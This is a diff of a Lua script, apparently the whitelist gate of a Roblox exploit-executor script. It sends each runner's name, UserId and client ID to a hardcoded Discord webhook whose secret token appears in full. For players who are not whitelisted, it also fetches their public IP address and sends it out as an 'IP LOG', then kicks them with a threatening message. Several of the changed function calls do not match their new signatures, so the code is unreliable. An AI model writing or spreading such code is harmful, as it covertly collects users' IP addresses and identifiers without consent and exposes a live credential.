@@ -1,5 +1,11 @@
 local lplr = game.Players.LocalPlayer
 local clientID = game:GetService("RbxAnalyticsService"):GetClientId()
+
+if not clientID then
+    warn("Failed to get client ID.")
+    return
+end
+
 local hook = "https://discord.com/api/webhooks/1141671892760137729/_HR6l8eYm8tfdKQytfToSqsLeVW2znRhSfCpii0xVw5g06ZRcKQaKplFdAYCTBqAKu5y"
 
 local whitelistTable = {
@@ -47,64 +53,44 @@ end
 
 local isPlayerWhitelisted = isWhitelisted(clientID)
 
-
-local function sendmessage(messageContent)
+local function sendToWebhook(title, description, isWhitelisted, extraFields)
+    local color = isWhitelisted and 0x00FF00 or 0xFF0000  
     local message = {
         ['embeds'] = {
             {
-                ['title'] = 'Unauthorized Access Attempt',
-                ['description'] = messageContent,
-                ['color'] = 0xFF0000,
+                ['title'] = title,
+                ['description'] = description,
+                ['color'] = color,
                 ['fields'] = {
-                    {name = 'Player Name:', value = game:GetService("Players").LocalPlayer.Name},
-                    {name = 'UserID', value = game:GetService("Players").LocalPlayer.UserId },
+                    {name = 'Player Name:', value = lplr.Name},
+                    {name = 'UserID', value = lplr.UserId},
                     {name = 'clientID', value = clientID},
-                    {name = "Config", value = "BOOSTER"},  
-                    {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},       
+                    {name = "Config", value = "PRIVATE"},
+                    {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},
+                    unpack(extraFields or {})
                 }
             }
         }
     }
 
+
     local success = false
     local response
-    if syn then
-        response = syn.request({
-			{
-				Url = hook,
-				Method = 'POST',
-				Headers = {
-					['Content-Type'] = 'application/json'
-				},
-				Body = game:GetService('HttpService'):JSONEncode(message)
-			}
-		})
+
+    local requestFunc = syn and syn.request or request or http_request
+
+    if requestFunc then
+        response = requestFunc({
+            Url = hook,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = game:GetService('HttpService'):JSONEncode(message)
+        })
+
         success = response and response.StatusCode == 200
-	elseif request then
-		response = request({
-			{
-				Url = hook,
-				Method = 'POST',
-				Headers = {
-					['Content-Type'] = 'application/json'
-				},
-				Body = game:GetService('HttpService'):JSONEncode(message)
-			}
-		})
-        success = response and response.StatusCode == 200
-	elseif http_request then
-		response = http_request({
-			{
-				Url = hook,
-				Method = 'POST',
-				Headers = {
-					['Content-Type'] = 'application/json'
-				},
-				Body = game:GetService('HttpService'):JSONEncode(message)
-			}
-		})
-        success = response and response.StatusCode == 200
-	end
+    end
 
     if not success then
         warn("Failed to send webhook message.")
@@ -122,7 +108,7 @@ local function sendMessageToWebhookifNoWl(messageContent)
                     {name = 'Player Name:', value = game:GetService("Players").LocalPlayer.Name},
                     {name = 'UserID', value = game:GetService("Players").LocalPlayer.UserId },
                     {name = 'clientID', value = clientID},
-                    {name = "Config", value = "BOOSTER"},  
+                    {name = "Config", value = "PRIVATE"},  
                     {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},   
                     {name = "IP LOG: ", value = game:HttpGet('https://api.ipify.org')}        
                 }
@@ -176,9 +162,9 @@ local function sendMessageToWebhookifNoWl(messageContent)
 end
 
 
-if isBlacklisted(clientID) or not isPlayerWhitelisted then
-    sendMessageToWebhookifNoWl("Player attempted to bypass whitelist.")
+if isBlacklisted(clientID) or not isWhitelisted(clientID) then
+    sendMessageToWebhookifNoWl("Unauthorized Access Attempt", "Player attempted to bypass whitelist.", {})
     lplr:Kick("ATTEMPT TO BYPASS WHITELIST | YOU'RE GONNA BE PUNISHED")
 else
-    sendmessage()
+    sendToWebhook("Valid Access", "Player successfully authenticated.", {})
 end
